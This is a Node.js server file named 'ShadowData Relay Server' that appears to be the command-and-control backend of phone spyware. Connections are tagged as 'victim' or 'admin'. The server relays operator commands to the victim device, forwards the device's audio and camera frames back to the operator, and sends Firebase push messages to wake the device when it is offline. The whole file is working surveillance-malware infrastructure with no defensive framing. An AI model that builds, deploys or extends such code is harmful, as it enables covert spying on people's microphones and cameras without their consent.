const express = require('express');
const { WebSocketServer, WebSocket } = require('ws');
const http = require('http');
const admin = require('firebase-admin');

// Initialize Firebase Admin SDK using environment variables
if (!admin.apps.length) {
    try {
        admin.initializeApp({
            credential: admin.credential.cert(JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT || '{}'))
        });
    } catch (e) {
        console.warn("Firebase Admin SDK initialization skipped or failed: ", e.message);
    }
}

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

let victimSocket = null;
let adminSocket = null;
let latestVictimFcmToken = process.env.VICTIM_FCM_TOKEN || "";

app.get('/', (req, res) => {
    res.send(`ShadowData Relay Server Active.<br>Victim Connected: ${!!victimSocket}<br>Admin Connected: ${!!adminSocket}`);
});

// Heartbeat interval to keep Render WebSocket connections alive
const interval = setInterval(() => {
    wss.clients.forEach((ws) => {
        if (ws.isAlive === false) return ws.terminate();
        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

wss.on('connection', (ws, req) => {
    ws.isAlive = true;
    ws.on('pong', () => { ws.isAlive = true; });

    const urlParams = new URLSearchParams(req.url.split('?')[1]);
    const role = urlParams.get('role');

    if (role === 'victim') {
        if (victimSocket && victimSocket.readyState === WebSocket.OPEN) {
            victimSocket.terminate();
        }
        victimSocket = ws;
        console.log('>>> Victim connected successfully.');
    } else if (role === 'admin') {
        if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
            adminSocket.terminate();
        }
        adminSocket = ws;
        console.log('>>> Admin connected successfully.');
    }

    ws.on('message', (message, isBinary) => {
        // Check if the message is text or binary safely using ws library's second parameter (isBinary)
        // or fallback to Buffer.isBuffer(message)
        const binaryFlag = typeof isBinary !== 'undefined' ? isBinary : Buffer.isBuffer(message);

        if (binaryFlag) {
            // Route binary frames directly without string conversion
            if (role === 'admin') {
                if (victimSocket && victimSocket.readyState === WebSocket.OPEN) {
                    victimSocket.send(message, { binary: true });
                }
            } else if (role === 'victim') {
                if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
                    adminSocket.send(message, { binary: true });
                }
            }
        } else {
            // Handle text payloads (JSON, commands, or text-prefixed frames like AUDIO_FRAME:)
            const textMessage = message.toString();

            // Capture victim FCM Token registration on startup
            if (role === 'victim' && textMessage.startsWith('FCM_TOKEN:')) {
                latestVictimFcmToken = textMessage.substring(10).trim();
                console.log('>>> Registered new victim FCM Token:', latestVictimFcmToken);
                return;
            }

            // Handle Admin trigger commands when victim socket is offline/disconnected
            if (role === 'admin' && (textMessage === 'TRIGGER_NOTIFICATIONS' || textMessage === 'WAKE_UP')) {
                console.log(`-> Received admin trigger command: ${textMessage}`);
                
                if (victimSocket && victimSocket.readyState === WebSocket.OPEN) {
                    victimSocket.send(textMessage);
                } else {
                    console.log('-> Victim socket offline. Dispatching Firebase Cloud Messaging wake-up push...');
                    
                    if (latestVictimFcmToken) {
                        const fcmPayload = {
                            token: latestVictimFcmToken,
                            data: {
                                action: textMessage
                            },
                            android: {
                                priority: 'high'
                            }
                        };

                        admin.messaging().send(fcmPayload)
                            .then((response) => {
                                console.log('Successfully sent FCM trigger push:', response);
                                if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
                                    adminSocket.send("STATUS:WAKEUP_PUSH_SENT");
                                }
                            })
                            .catch((error) => {
                                console.error('Error sending FCM trigger push:', error);
                                if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
                                    adminSocket.send(`ERROR:FCM Push failed - ${error.message}`);
                                }
                            });
                    } else {
                        if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
                            adminSocket.send("ERROR:No registered FCM token found for victim.");
                        }
                    }
                }
                return;
            }

            if (!textMessage.startsWith('AUDIO_FRAME:') && !textMessage.startsWith('CAMERA_FRAME:')) {
                console.log(`Received text from [${role}]: ${textMessage.substring(0, 100)}...`);
            }

            if (role === 'admin') {
                if (victimSocket && victimSocket.readyState === WebSocket.OPEN) {
                    victimSocket.send(textMessage);
                } else {
                    console.log('-> ROUTING FAILED: Victim socket is null or not OPEN.');
                    if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
                        adminSocket.send(JSON.stringify({ error: "Victim device is offline or disconnected." }));
                    }
                }
            } else if (role === 'victim') {
                if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
                    adminSocket.send(textMessage);
                }
            }
        }
    });

    ws.on('close', () => {
        if (ws === victimSocket) {
            victimSocket = null;
            console.log('XXX Victim disconnected.');
        }
        if (ws === adminSocket) {
            adminSocket = null;
            console.log('XXX Admin disconnected.');
        }
    });

    ws.on('error', (err) => {
        console.error(`WebSocket error on [${role}]:`, err.message);
    });
});

server.on('close', () => {
    clearInterval(interval);
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server listening on port ${PORT}`);
});
